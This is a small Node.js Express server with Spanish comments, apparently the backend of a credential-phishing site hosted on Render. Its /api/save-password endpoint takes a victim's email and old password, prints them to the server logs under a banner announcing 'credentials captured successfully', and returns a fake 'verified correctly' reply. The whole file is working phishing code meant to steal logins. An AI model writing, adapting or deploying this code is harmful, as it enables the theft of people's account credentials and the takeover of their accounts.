const express = require('express');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Ruta que captura la información y la muestra en los Logs de Render
app.post('/api/save-password', (req, res) => {
  const { email, oldPassword } = req.body;

  // Esto aparecerá en la pestaña "Logs" de tu panel de Render
  console.log("\n========================================");
  console.log("¡CREDENCIALES CAPTURADAS EXITOSAMENTE!");
  console.log(`Correo: ${email}`);
  console.log(`Contraseña: ${oldPassword}`);
  console.log("========================================\n");

  res.json({ success: true, message: 'Verificado correctamente.' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor abierto en el puerto ${PORT}`);
});
